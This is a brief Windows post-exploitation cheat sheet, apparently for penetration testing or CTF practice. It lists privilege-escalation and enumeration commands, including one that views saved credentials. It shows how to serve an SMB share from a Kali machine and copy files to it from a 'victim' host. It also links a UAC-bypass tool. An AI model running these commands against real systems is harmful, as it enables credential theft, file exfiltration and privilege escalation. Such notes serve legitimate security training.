````markdown
## Windows Post-Exploitation Tips & Tools

### Enumeration & Privilege Escalation

- `icacls` – To check file and directory permissions  
- `schtasks` – To list and view scheduled tasks  
- `sc` – Service control manager (Windows equivalent of `systemctl`)  
- `whoami /priv` – To view privileges of the current user  
- `takeown` – To take ownership of a file  
- `cmdkey /list` – To view saved credentials in the Windows Credential Manager  
````
### File Sharing (SMB)

To share files from your Kali machine:

```bash
python smbserver.py share . -user alex -pass alex -smb2support
```

To retrieve files on the victim machine:

```cmd
net use \\{ip}\share /u:alex alex
copy file.file \\{ip}\share
```

### File Searching (Windows)

To search for files (similar to `grep`):

```cmd
search -f *flag* -r
```

### UAC Bypass

* [UACME GitHub Repository](https://github.com/hfiref0x/UACME) – Tool to bypass UAC
  *Note: Requires an Admin account with medium integrity level*


